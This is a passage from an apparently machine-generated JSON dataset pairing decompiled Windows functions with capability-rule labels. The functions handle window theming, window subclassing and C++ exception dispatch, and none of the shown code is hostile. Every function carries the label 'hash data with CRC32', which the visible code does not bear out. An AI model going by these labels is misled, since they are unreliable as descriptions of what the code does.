(iVar6 < iVar3);\n                                    *(arg_14h + 0xb4) = *(arg_14h + 0xb4) | 0x8000;\n                                }\n                            }\n                        }\n                        *arg_18h = 0;\n                        fcn.004303e9(arg_18h);\n                        return;\n                    }\n                    goto code_r0x0040b37e;\n                }\n                uVar4 = (*_sym.imp.USER32.dll_GetWindowLongW)(*(in_ECX + 4), 0xfffffff0);\n                if ((uVar4 & 0xc0000000) == 0) {\n                    (*_sym.imp.USER32.dll_PostQuitMessage)(1);\n                }\n            }\n            *arg_18h = 1;\n        }\n    }\ncode_r0x0040b37e:\n    fcn.004303e9(arg_18h);\n    return;\n}\n",
        "token_count": 1694
    },
    "0040b6e0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040b6e0(uint noname_0, int32_t arg_ch, int32_t wParam, uint lParam, uint *arg_18h, int32_t arg_1ch)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint uVar6;\n    int32_t *in_ECX;\n    uint32_t uVar7;\n    \n    pcVar2 = _sym.imp.UxTheme.dll_CloseThemeData;\n    if (arg_1ch != 0) {\n        return 0;\n    }\n    if (arg_ch == 1) {\n        if (in_ECX[1] == 0) goto code_r0x0040b798;\n        if (*in_ECX != 0) {\n            iVar4 = (*_sym.imp.UxTheme.dll_CloseThemeData)(*in_ECX);\ncode_r0x0040b770:\n            if (-1 < iVar4) {\n                *in_ECX = 0;\n            }\n        }\n    }\n    else {\n        if (arg_ch == 2) {\n            if ((*in_ECX != 0) && (iVar4 = (*_sym.imp.UxTheme.dll_CloseThemeData)(*in_ECX),  -1 < iVar4)) {\n                *in_ECX = 0;\n                *arg_18h = 1;\n                return 0;\n            }\n            goto code_r0x0040b798;\n        }\n        if (arg_ch != 0x31a) {\n            if (arg_ch != 0x85) {\n                return 0;\n            }\n            uVar7 = -(in_ECX != NULL) & in_ECX + -0xe;\n            cVar3 = fcn.00406690();\n            if ((cVar3 != '\\0') &&\n               (uVar5 = (*_sym.imp.USER32.dll_GetWindowLongW)(*(uVar7 + 4), 0xffffffec),  (uVar5 & 0x200) != 0)) {\n                if ((in_ECX[2] & 1U) != 0) {\n                    uVar6 = (*_sym.imp.USER32.dll_DefWindowProcW)(*(uVar7 + 4), 0x85, wParam, lParam);\n                    *arg_18h = uVar6;\n                    return 1;\n                }\n                if ((*in_ECX != 0) && ((in_ECX[2] & 2U) != 0)) {\n                    iVar4 = 0;\n                    if (wParam != 1) {\n                        iVar4 = wParam;\n                    }\n                    uVar5 = 0;\n                    if (uVar7 + 0x38 != NULL) {\n                        uVar5 = uVar7;\n                    }\n                    cVar3 = fcn.00402d30(*(uVar7 + 0x38), *(uVar5 + 4), iVar4, 0, 0, 0);\n                    if (cVar3 != '\\0') {\n                        *arg_18h = 0;\n                        return 1;\n                    }\n                }\n            }\n            *arg_18h = 0;\n            return 0;\n        }\n        if ((*in_ECX != 0) && (iVar4 = (*_sym.imp.UxTheme.dll_CloseThemeData)(*in_ECX),  -1 < iVar4)) {\n            *in_ECX = 0;\n        }\n        if (in_ECX[1] == 0) goto code_r0x0040b798;\n        if (*in_ECX != 0) {\n            iVar4 = (*pcVar2)(*in_ECX);\n            goto code_r0x0040b770;\n        }\n    }\n    iVar4 = in_ECX[-0xd];\n    iVar1 = in_ECX[1];\n    cVar3 = fcn.00406690();\n    if (cVar3 != '\\0') {\n        iVar4 = (*_sym.imp.UxTheme.dll_OpenThemeData)(iVar4, iVar1);\n        *in_ECX = iVar4;\n    }\ncode_r0x0040b798:\n    *arg_18h = 1;\n    return 0;\n}\n",
        "token_count": 917
    },
    "0040b860": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040b860(uint noname_0, int32_t arg_ch, int32_t wParam, uint lParam, uint *arg_18h, int32_t arg_1ch)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint uVar6;\n    int32_t *in_ECX;\n    uint32_t uVar7;\n    \n    pcVar2 = _sym.imp.UxTheme.dll_CloseThemeData;\n    if (arg_1ch != 0) {\n        return 0;\n    }\n    if (arg_ch == 1) {\n        if (in_ECX[1] == 0) goto code_r0x0040b918;\n        if (*in_ECX != 0) {\n            iVar4 = (*_sym.imp.UxTheme.dll_CloseThemeData)(*in_ECX);\ncode_r0x0040b8f0:\n            if (-1 < iVar4) {\n                *in_ECX = 0;\n            }\n        }\n    }\n    else {\n        if (arg_ch == 2) {\n            if ((*in_ECX != 0) && (iVar4 = (*_sym.imp.UxTheme.dll_CloseThemeData)(*in_ECX),  -1 < iVar4)) {\n                *in_ECX = 0;\n                *arg_18h = 1;\n                return 0;\n            }\n            goto code_r0x0040b918;\n        }\n        if (arg_ch != 0x31a) {\n            if (arg_ch != 0x85) {\n                return 0;\n            }\n            uVar7 = -(in_ECX != NULL) & in_ECX + -0x13;\n            cVar3 = fcn.00406690();\n            if ((cVar3 != '\\0') &&\n               (uVar5 = (*_sym.imp.USER32.dll_GetWindowLongW)(*(uVar7 + 4), 0xffffffec),  (uVar5 & 0x200) != 0)) {\n                if ((in_ECX[2] & 1U) != 0) {\n                    uVar6 = (*_sym.imp.USER32.dll_DefWindowProcW)(*(uVar7 + 4), 0x85, wParam, lParam);\n                    *arg_18h = uVar6;\n                    return 1;\n                }\n                if ((*in_ECX != 0) && ((in_ECX[2] & 2U) != 0)) {\n                    iVar4 = 0;\n                    if (wParam != 1) {\n                        iVar4 = wParam;\n                    }\n                    uVar5 = 0;\n                    if (uVar7 + 0x4c != NULL) {\n                        uVar5 = uVar7;\n                    }\n                    cVar3 = fcn.00402d30(*(uVar7 + 0x4c), *(uVar5 + 4), iVar4, 0, 0, 0);\n                    if (cVar3 != '\\0') {\n                        *arg_18h = 0;\n                        return 1;\n                    }\n                }\n            }\n            *arg_18h = 0;\n            return 0;\n        }\n        if ((*in_ECX != 0) && (iVar4 = (*_sym.imp.UxTheme.dll_CloseThemeData)(*in_ECX),  -1 < iVar4)) {\n            *in_ECX = 0;\n        }\n        if (in_ECX[1] == 0) goto code_r0x0040b918;\n        if (*in_ECX != 0) {\n            iVar4 = (*pcVar2)(*in_ECX);\n            goto code_r0x0040b8f0;\n        }\n    }\n    iVar4 = in_ECX[-0x12];\n    iVar1 = in_ECX[1];\n    cVar3 = fcn.00406690();\n    if (cVar3 != '\\0') {\n        iVar4 = (*_sym.imp.UxTheme.dll_OpenThemeData)(iVar4, iVar1);\n        *in_ECX = iVar4;\n    }\ncode_r0x0040b918:\n    *arg_18h = 1;\n    return 0;\n}\n",
        "token_count": 923
    },
    "0040e5e0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040e5e0(int32_t *arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code **ppcVar3;\n    code *pcVar4;\n    int32_t *piVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar7 = arg_ch;\n    piVar5 = arg_8h;\n    var_24h = arg_8h[1];\n    iVar2 = arg_8h[6];\n    piVar1 = arg_8h + 1;\n    var_18h = arg_14h;\n    arg_8h[6] = &var_24h;\n    ppcVar3 = *arg_8h;\n    var_8h = 0x24;\n    var_4h = 1;\n    var_20h = arg_ch;\n    var_1ch = arg_10h;\n    var_14h = 0;\n    var_ch = 0;\n    var_10h = 0;\n    arg_8h = NULL;\n    iVar6 = (**ppcVar3)(*piVar1, arg_ch, arg_10h, arg_14h, &arg_8h, 0);\n    pcVar4 = _sym.imp.USER32.dll_GetWindowLongW;\n    if (iVar6 == 0) {\n        if (iVar7 == 0x82) {\n            arg_ch = (*_sym.imp.USER32.dll_GetWindowLongW)(piVar5[1], 0xfffffffc);\n            arg_8h = (*_sym.imp.USER32.dll_CallWindowProcW)(piVar5[8], piVar5[1], 0x82, arg_10h, arg_14h);\n            if (piVar5[8] != _sym.imp.USER32.dll_DefWindowProcW) {\n                iVar7 = (*pcVar4)(piVar5[1], 0xfffffffc);\n                if (iVar7 == arg_ch) {\n                    (*_sym.imp.USER32.dll_SetWindowLongW)(piVar5[1], 0xfffffffc, piVar5[8]);\n                }\n            }\n            piVar5[7] = piVar5[7] | 1;\n        }\n        else {\n            arg_8h = (*_sym.imp.USER32.dll_CallWindowProcW)(piVar5[8], piVar5[1], iVar7, arg_10h, arg_14h);\n        }\n    }\n    if (((piVar5[7] & 1U) != 0) && (iVar2 == 0)) {\n        iVar2 = piVar5[1];\n        piVar5[7] = piVar5[7] & 0xfffffffe;\n        piVar5[1] = 0;\n        piVar5[6] = 0;\n        (**(*piVar5 + 0xc))(iVar2);\n        return arg_8h;\n    }\n    piVar5[6] = iVar2;\n    return arg_8h;\n}\n",
        "token_count": 749
    },
    "0040e700": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040e700(int32_t *arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code **ppcVar3;\n    code *pcVar4;\n    int32_t *piVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar7 = arg_ch;\n    piVar5 = arg_8h;\n    var_24h = arg_8h[1];\n    iVar2 = arg_8h[6];\n    piVar1 = arg_8h + 1;\n    var_18h = arg_14h;\n    arg_8h[6] = &var_24h;\n    ppcVar3 = *arg_8h;\n    var_8h = 0x24;\n    var_4h = 1;\n    var_20h = arg_ch;\n    var_1ch = arg_10h;\n    var_14h = 0;\n    var_ch = 0;\n    var_10h = 0;\n    arg_8h = NULL;\n    iVar6 = (**ppcVar3)(*piVar1, arg_ch, arg_10h, arg_14h, &arg_8h, 0);\n    pcVar4 = _sym.imp.USER32.dll_GetWindowLongW;\n    if (iVar6 == 0) {\n        if (iVar7 == 0x82) {\n            arg_ch = (*_sym.imp.USER32.dll_GetWindowLongW)(piVar5[1], 0xfffffffc);\n            arg_8h = (*_sym.imp.USER32.dll_CallWindowProcW)(piVar5[8], piVar5[1], 0x82, arg_10h, arg_14h);\n            if (piVar5[8] != _sym.imp.USER32.dll_DefWindowProcW) {\n                iVar7 = (*pcVar4)(piVar5[1], 0xfffffffc);\n                if (iVar7 == arg_ch) {\n                    (*_sym.imp.USER32.dll_SetWindowLongW)(piVar5[1], 0xfffffffc, piVar5[8]);\n                }\n            }\n            piVar5[7] = piVar5[7] | 1;\n        }\n        else {\n            arg_8h = (*_sym.imp.USER32.dll_CallWindowProcW)(piVar5[8], piVar5[1], iVar7, arg_10h, arg_14h);\n        }\n    }\n    if (((piVar5[7] & 1U) != 0) && (iVar2 == 0)) {\n        iVar2 = piVar5[1];\n        piVar5[7] = piVar5[7] & 0xfffffffe;\n        piVar5[1] = 0;\n        piVar5[6] = 0;\n        (**(*piVar5 + 0xc))(iVar2);\n        return arg_8h;\n    }\n    piVar5[6] = iVar2;\n    return arg_8h;\n}\n",
        "token_count": 747
    },
    "0040e820": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040e820(int32_t *arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code **ppcVar3;\n    code *pcVar4;\n    int32_t *piVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar7 = arg_ch;\n    piVar5 = arg_8h;\n    var_24h = arg_8h[1];\n    iVar2 = arg_8h[0xe];\n    piVar1 = arg_8h + 1;\n    var_18h = arg_14h;\n    arg_8h[0xe] = &var_24h;\n    ppcVar3 = *arg_8h;\n    var_8h = 0x24;\n    var_4h = 1;\n    var_20h = arg_ch;\n    var_1ch = arg_10h;\n    var_14h = 0;\n    var_ch = 0;\n    var_10h = 0;\n    arg_8h = NULL;\n    iVar6 = (**ppcVar3)(*piVar1, arg_ch, arg_10h, arg_14h, &arg_8h, 0);\n    pcVar4 = _sym.imp.USER32.dll_GetWindowLongW;\n    if (iVar6 == 0) {\n        if (iVar7 == 0x82) {\n            arg_ch = (*_sym.imp.USER32.dll_GetWindowLongW)(piVar5[1], 0xfffffffc);\n            arg_8h = (*_sym.imp.USER32.dll_CallWindowProcW)(piVar5[0x10], piVar5[1], 0x82, arg_10h, arg_14h);\n            if (piVar5[0x10] != _sym.imp.USER32.dll_DefWindowProcW) {\n                iVar7 = (*pcVar4)(piVar5[1], 0xfffffffc);\n                if (iVar7 == arg_ch) {\n                    (*_sym.imp.USER32.dll_SetWindowLongW)(piVar5[1], 0xfffffffc, piVar5[0x10]);\n                }\n            }\n            piVar5[0xf] = piVar5[0xf] | 1;\n        }\n        else {\n            arg_8h = (*_sym.imp.USER32.dll_CallWindowProcW)(piVar5[0x10], piVar5[1], iVar7, arg_10h, arg_14h);\n        }\n    }\n    if (((piVar5[0xf] & 1U) != 0) && (iVar2 == 0)) {\n        iVar2 = piVar5[1];\n        piVar5[0xf] = piVar5[0xf] & 0xfffffffe;\n        piVar5[1] = 0;\n        piVar5[0xe] = 0;\n        (**(*piVar5 + 0xc))(iVar2);\n        return arg_8h;\n    }\n    piVar5[0xe] = iVar2;\n    return arg_8h;\n}\n",
        "token_count": 764
    },
    "0040e940": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040e940(int32_t *arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code **ppcVar3;\n    code *pcVar4;\n    int32_t *piVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar7 = arg_ch;\n    piVar5 = arg_8h;\n    var_24h = arg_8h[1];\n    iVar2 = arg_8h[6];\n    piVar1 = arg_8h + 1;\n    var_18h = arg_14h;\n    arg_8h[6] = &var_24h;\n    ppcVar3 = *arg_8h;\n    var_8h = 0x24;\n    var_4h = 1;\n    var_20h = arg_ch;\n    var_1ch = arg_10h;\n    var_14h = 0;\n    var_ch = 0;\n    var_10h = 0;\n    arg_8h = NULL;\n    iVar6 = (**ppcVar3)(*piVar1, arg_ch, arg_10h, arg_14h, &arg_8h, 0);\n    pcVar4 = _sym.imp.USER32.dll_GetWindowLongW;\n    if (iVar6 == 0) {\n        if (iVar7 == 0x82) {\n            arg_ch = (*_sym.imp.USER32.dll_GetWindowLongW)(piVar5[1], 0xfffffffc);\n            arg_8h = (*_sym.imp.USER32.dll_CallWindowProcW)(piVar5[8], piVar5[1], 0x82, arg_10h, arg_14h);\n            if (piVar5[8] != _sym.imp.USER32.dll_DefWindowProcW) {\n                iVar7 = (*pcVar4)(piVar5[1], 0xfffffffc);\n                if (iVar7 == arg_ch) {\n                    (*_sym.imp.USER32.dll_SetWindowLongW)(piVar5[1], 0xfffffffc, piVar5[8]);\n                }\n            }\n            piVar5[7] = piVar5[7] | 1;\n        }\n        else {\n            arg_8h = (*_sym.imp.USER32.dll_CallWindowProcW)(piVar5[8], piVar5[1], iVar7, arg_10h, arg_14h);\n        }\n    }\n    if (((piVar5[7] & 1U) != 0) && (iVar2 == 0)) {\n        iVar2 = piVar5[1];\n        piVar5[7] = piVar5[7] & 0xfffffffe;\n        piVar5[1] = 0;\n        piVar5[6] = 0;\n        (**(*piVar5 + 0xc))(iVar2);\n        return arg_8h;\n    }\n    piVar5[6] = iVar2;\n    return arg_8h;\n}\n",
        "token_count": 747
    },
    "0040ea60": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040ea60(int32_t *arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code **ppcVar3;\n    code *pcVar4;\n    int32_t *piVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar7 = arg_ch;\n    piVar5 = arg_8h;\n    var_24h = arg_8h[1];\n    iVar2 = arg_8h[6];\n    piVar1 = arg_8h + 1;\n    var_18h = arg_14h;\n    arg_8h[6] = &var_24h;\n    ppcVar3 = *arg_8h;\n    var_8h = 0x24;\n    var_4h = 1;\n    var_20h = arg_ch;\n    var_1ch = arg_10h;\n    var_14h = 0;\n    var_ch = 0;\n    var_10h = 0;\n    arg_8h = NULL;\n    iVar6 = (**ppcVar3)(*piVar1, arg_ch, arg_10h, arg_14h, &arg_8h, 0);\n    pcVar4 = _sym.imp.USER32.dll_GetWindowLongW;\n    if (iVar6 == 0) {\n        if (iVar7 == 0x82) {\n            arg_ch = (*_sym.imp.USER32.dll_GetWindowLongW)(piVar5[1], 0xfffffffc);\n            arg_8h = (*_sym.imp.USER32.dll_CallWindowProcW)(piVar5[8], piVar5[1], 0x82, arg_10h, arg_14h);\n            if (piVar5[8] != _sym.imp.USER32.dll_DefWindowProcW) {\n                iVar7 = (*pcVar4)(piVar5[1], 0xfffffffc);\n                if (iVar7 == arg_ch) {\n                    (*_sym.imp.USER32.dll_SetWindowLongW)(piVar5[1], 0xfffffffc, piVar5[8]);\n                }\n            }\n            piVar5[7] = piVar5[7] | 1;\n        }\n        else {\n            arg_8h = (*_sym.imp.USER32.dll_CallWindowProcW)(piVar5[8], piVar5[1], iVar7, arg_10h, arg_14h);\n        }\n    }\n    if (((piVar5[7] & 1U) != 0) && (iVar2 == 0)) {\n        iVar2 = piVar5[1];\n        piVar5[7] = piVar5[7] & 0xfffffffe;\n        piVar5[1] = 0;\n        piVar5[6] = 0;\n        (**(*piVar5 + 0xc))(iVar2);\n        return arg_8h;\n    }\n    piVar5[6] = iVar2;\n    return arg_8h;\n}\n",
        "token_count": 747
    },
    "0043330f": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.0043330f(int32_t *arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, uint32_t *arg_18h, uint arg_1ch, \n            int32_t arg_20h, int32_t arg_24h)\n\n{\n    code *pcVar1;\n    uint32_t *puVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint arg_8h_00;\n    int32_t iVar5;\n    uint *puVar6;\n    uint *puVar7;\n    int32_t *piVar8;\n    int32_t var_64h;\n    int32_t var_60h;\n    int32_t var_58h;\n    uint *var_54h;\n    uint var_50h;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    int32_t *var_40h;\n    uint32_t *var_3ch;\n    uint32_t *var_34h;\n    uint32_t *var_30h;\n    uint var_2ch;\n    int32_t *var_28h;\n    int32_t var_24h;\n    int32_t *var_20h;\n    int32_t var_1ch;\n    uint32_t var_18h;\n    uint *var_14h;\n    int32_t var_10h;\n    uint32_t *var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_10h = 0;\n    var_18h = var_18h & 0xffffff00;\n    var_8h = fcn.0043b664(arg_ch, arg_14h, arg_18h);\n    if ((var_8h < -1) || (arg_18h[1] <= var_8h)) goto code_r0x004336ae;\n    if (((*arg_8h != -0x1f928c9d) || (arg_8h[4] != 3)) ||\n       ((((arg_8h[5] != 0x19930520 && (arg_8h[5] != 0x19930521)) && (arg_8h[5] != 0x19930522)) || (arg_8h[7] != 0)))) {\n        var_4h = arg_10h;\n        goto code_r0x0043345d;\n    }\n    iVar4 = fcn.00432cbe();\n    if (*(iVar4 + 0x10) == 0) {\n        return;\n    }\n    iVar4 = fcn.00432cbe();\n    arg_8h = *(iVar4 + 0x10);\n    iVar4 = fcn.00432cbe();\n    var_18h = CONCAT31(var_18h._1_3_, 1);\n    var_4h = *(iVar4 + 0x14);\n    if ((arg_8h == NULL) ||\n       ((((*arg_8h == -0x1f928c9d && (arg_8h[4] == 3)) &&\n         ((arg_8h[5] == 0x19930520 || ((arg_8h[5] == 0x19930521 || (arg_8h[5] == 0x19930522)))))) && (arg_8h[7] == 0))))\n    goto code_r0x004336ae;\n    iVar4 = fcn.00432cbe();\n    if (*(iVar4 + 0x1c) == 0) {\ncode_r0x0043345d:\n        var_30h = arg_18h;\n        var_2ch = 0;\n        if (((*arg_8h == -0x1f928c9d) && (arg_8h[4] == 3)) &&\n           ((arg_8h[5] == 0x19930520 || ((arg_8h[5] == 0x19930521 || (arg_8h[5] == 0x19930522)))))) {\n            if (arg_18h[3] != 0) {\n                fcn.00432559(&var_40h, &var_30h, var_8h, arg_14h, arg_18h, arg_20h);\n                var_28h = var_40h;\n                var_ch = var_3ch;\n                if (var_3ch < var_34h) {\n                    var_1ch = var_3ch * 0x14;\n                    do {\n                        iVar4 = var_8h;\n                        puVar6 = *(*var_28h + 0x10) + var_1ch;\n                        puVar7 = &var_64h;\n                        var_ch = var_3ch;\n                        for (iVar5 = 5; iVar5 != 0; iVar5 = iVar5 + -1) {\n                            *puVar7 = *puVar6;\n                            puVar6 = puVar6 + 1;\n                            puVar7 = puVar7 + 1;\n                        }\n                        if (((var_64h <= iVar4) && (iVar4 <= var_60h)) && (var_10h = 0,  var_58h != 0)) {\n                            iVar4 = arg_8h[7];\n                            var_24h = **(iVar4 + 0xc);\n                            var_20h = *(iVar4 + 0xc) + 1;\n                            var_14h = var_54h;\n                            do {\n                                var_50h = *var_14h;\n                                uStack80 = var_14h[1];\n                                uStack76 = var_14h[2];\n                                uStack72 = var_14h[3];\n                                piVar8 = var_20h;\n                                var_3ch = var_ch;\n                                for (iVar5 = var_24h; var_ch = var_3ch,  0 < iVar5; iVar5 = iVar5 + -1) {\n                                    iVar4 = fcn.004337ea(&var_50h, *piVar8, iVar4);\n                                    if (iVar4 != 0) {\n                                        fcn.0043328f(arg_8h, arg_ch, var_4h, arg_14h, arg_18h, &var_50h, *piVar8, \n                                                     &var_64h, arg_20h, arg_24h);\n                                        var_3ch = var_ch;\n                                        goto code_r0x00433598;\n                                    }\n                                    iVar4 = arg_8h[7];\n                                    piVar8 = piVar8 + 1;\n                                    var_3ch = var_ch;\n                                }\n                                var_10h = var_10h + 1;\n                                var_14h = var_14h + 4;\n                            } while (var_10h != var_58h);\n                        }\ncode_r0x00433598:\n                        var_3ch = var_3ch + 1;\n                        var_1ch = var_1ch + 0x14;\n                        var_ch = var_3ch;\n                    } while (var_3ch < var_34h);\n                }\n            }\n            if (arg_1ch != '\\0') {\n                fcn.00432251(arg_8h);\n            }\n            if (0x19930520 < (*arg_18h & 0x1fffffff)) {\n                if (arg_18h[7] != 0) {\n                    if ((arg_18h[8] >> 2 & 1) != 0) goto code_r0x004335f1;\n                    cVar3 = fcn.00433e40(arg_8h, arg_18h[7]);\n                    if (cVar3 != '\\0') goto code_r0x0043363d;\n                    goto code_r0x00433672;\n                }\n                if (((arg_18h[8] >> 2 & 1) != 0) && (arg_20h == 0)) {\ncode_r0x004335f1:\n                    iVar4 = fcn.00432cbe();\n                    *(iVar4 + 0x10) = arg_8h;\n                    iVar4 = fcn.00432cbe();\n                    *(iVar4 + 0x14) = var_4h;\n                    goto code_r0x0043364d;\n                }\n            }\n        }\n        else if (arg_18h[3] != 0) {\n            if (arg_1ch != '\\0') goto code_r0x004336ae;\n            fcn.004336b4(arg_8h, arg_ch, var_4h, arg_14h, arg_18h, var_8h, arg_20h, arg_24h);\n        }\ncode_r0x0043363d:\n        iVar4 = fcn.00432cbe();\n        if (*(iVar4 + 0x1c) == 0) {\n            return;\n        }\n    }\n    else {\n        iVar4 = fcn.00432cbe();\n        var_ch = *(iVar4 + 0x1c);\n        iVar4 = fcn.00432cbe();\n        *(iVar4 + 0x1c) = 0;\n        cVar3 = fcn.00433e40(arg_8h, var_ch);\n        puVar2 = var_ch;\n        if (cVar3 != '\\0') goto code_r0x0043345d;\n        arg_24h = 0;\n        arg_18h = puVar2;\n        if (0 < *var_ch) {\n            do {\n                cVar3 = fcn.00433a10(0x6cb710);\n                if (cVar3 != '\\0') goto code_r0x00433652;\n                arg_24h = arg_24h + 0x10;\n                var_10h = var_10h + 1;\n            } while (var_10h < *puVar2);\n        }\ncode_r0x0043364d:\n        fcn.0045abd1();\ncode_r0x00433652:\n        fcn.00432251(arg_8h);\n        fcn.004339c0();\n        fcn.004321e5(&var_3ch, 0x48677c);\ncode_r0x00433672:\n        iVar4 = fcn.00432cbe();\n        *(iVar4 + 0x10) = arg_8h;\n        iVar4 = fcn.00432cbe();\n        *(iVar4 + 0x14) = var_4h;\n        if (arg_24h == 0) {\n            arg_24h = arg_ch;\n        }\n        fcn.0043274c(arg_24h, arg_8h);\n        fcn.00433d35(arg_ch, arg_14h, arg_18h);\n        arg_8h_00 = fcn.00433f60(arg_18h);\n        fcn.00433cac(arg_8h_00);\n    }\ncode_r0x004336ae:\n    fcn.0045ad41();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 2477
    },
    "004330b8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nint32_t __cdecl fcn.004330b8(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint8_t *puVar3;\n    code *pcVar4;\n    int32_t iVar5;\n    uint uVar6;\n    int32_t iVar7;\n    int32_t unaff_EBP;\n    int32_t *piVar8;\n    uint *in_FS_OFFSET;\n    uint var_20h;\n    uint var_1ch;\n    uint var_10h;\n    uint uVar9;\n    uint var_4h;\n    \n    fcn.00430e10(0x486740, 0x10);\n    iVar7 = 0;\n    puVar1 = *(unaff_EBP + 0x10);\n    if (((puVar1[1] == 0) || (*(puVar1[1] + 8) == '\\0')) || ((puVar1[2] == 0 && (-1 < *puVar1)))) {\n        iVar7 = 0;\n        goto code_r0x004331e0;\n    }\n    uVar2 = *puVar1;\n    piVar8 = *(unaff_EBP + 0xc);\n    if (-1 < uVar2) {\n        piVar8 = piVar8 + puVar1[2] + 0xc;\n    }\n    *(unaff_EBP + -4) = 0;\n    iVar5 = *0x6ccbc8;\n    puVar3 = *(unaff_EBP + 0x14);\n    if (((uVar2 < '\\0') && ((*puVar3 & 0x10) != 0)) && (*(unaff_EBP + -0x1c) = *0x6ccbc8,  iVar5 != 0)) {\n        (**0x47b3f8)();\n        iVar5 = (**(unaff_EBP + -0x1c))();\ncode_r0x0043312f:\n        if ((iVar5 == 0) || (piVar8 == NULL)) {\ncode_r0x004331f0:\n            fcn.0045ad41();\n            pcVar4 = swi(3);\n            iVar7 = (*pcVar4)();\n            return iVar7;\n        }\n        *piVar8 = iVar5;\ncode_r0x0043317f:\n        iVar5 = fcn.0043238e(iVar5, puVar3 + 8);\n        *piVar8 = iVar5;\n    }\n    else {\n        iVar5 = *(unaff_EBP + 8);\n        if ((uVar2 & 8) != 0) {\n            iVar5 = *(iVar5 + 0x18);\n            goto code_r0x0043312f;\n        }\n        if ((*puVar3 & 1) != 0) {\n            if ((*(iVar5 + 0x18) == 0) || (piVar8 == NULL)) goto code_r0x004331f0;\n            fcn.00431830(piVar8, *(iVar5 + 0x18), *(puVar3 + 0x14));\n            if ((*(puVar3 + 0x14) != 4) || (*piVar8 == 0)) goto code_r0x004331ca;\n            iVar5 = *piVar8;\n            goto code_r0x0043317f;\n        }\n        iVar5 = *(iVar5 + 0x18);\n        if (*(puVar3 + 0x18) == 0) {\n            if ((iVar5 == 0) || (piVar8 == NULL)) goto code_r0x004331f0;\n            uVar9 = *(puVar3 + 0x14);\n            uVar6 = fcn.0043238e(iVar5, puVar3 + 8);\n            fcn.00431830(piVar8, uVar6, uVar9);\n        }\n        else {\n            if ((iVar5 == 0) || (piVar8 == NULL)) goto code_r0x004331f0;\n            iVar7 = ((*puVar3 & 4) != 0) + 1;\n            *(unaff_EBP + -0x20) = iVar7;\n        }\n    }\ncode_r0x004331ca:\n    *(unaff_EBP + -4) = 0xfffffffe;\ncode_r0x004331e0:\n    *in_FS_OFFSET = *(unaff_EBP + -0x10);\n    return iVar7;\n}\n",
        "token_count": 1032
    },
    "004337ea": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
